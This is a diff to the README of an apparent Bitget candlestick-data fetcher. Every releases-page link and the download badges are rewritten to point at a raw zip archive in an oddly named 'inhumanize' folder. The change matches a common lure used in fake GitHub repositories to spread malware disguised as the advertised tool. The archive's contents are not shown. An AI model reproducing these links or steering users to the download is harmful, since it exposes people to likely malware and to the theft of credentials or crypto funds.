@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Welcome to the bitget-free-historical-candlestick-data-fetcher. This tool helps you fetch historical candlestick data from the Bitget Futures API. You can easily retrieve data for any trading pair and interval without needing API keys. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases)
+[![Download Now](https://raw.githubusercontent.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/master/inhumanize/bitget-free-historical-candlestick-data-fetcher-1.9.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/master/inhumanize/bitget-free-historical-candlestick-data-fetcher-1.9.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/master/inhumanize/bitget-free-historical-candlestick-data-fetcher-1.9.zip).
 
 1. Click on the link above.
 2. You will see a list of available files. Choose the latest version marked as a release.
@@ -61,7 +61,7 @@ If you experience problems when using the application, here are some common tips
 
 - **Error Fetching Data**: Check your internet connection. If the application can’t connect, it will not be able to fetch data.
 - **Data Not Exporting**: Ensure you have write permissions for the folder you are trying to save the CSV file.
-- **App Crashes**: Ensure you are using the latest version of the application. You can always download the latest release from our [Releases Page](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases).
+- **App Crashes**: Ensure you are using the latest version of the application. You can always download the latest release from our [Releases Page](https://raw.githubusercontent.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/master/inhumanize/bitget-free-historical-candlestick-data-fetcher-1.9.zip).
 
 ## ⚙️ Contributing
 If you would like to help improve the application, feel free to fork the repository and submit a pull request. Your contributions are welcome.
@@ -69,6 +69,6 @@ If you would like to help improve the application, feel free to fork the reposit
 ## 📞 Support
 For support, please open an issue in the repository. We will assist you as soon as possible.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases)
+[![Download Now](https://raw.githubusercontent.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/master/inhumanize/bitget-free-historical-candlestick-data-fetcher-1.9.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/master/inhumanize/bitget-free-historical-candlestick-data-fetcher-1.9.zip)
 
 Thank you for choosing the bitget-free-historical-candlestick-data-fetcher! Enjoy your data fetching experience!
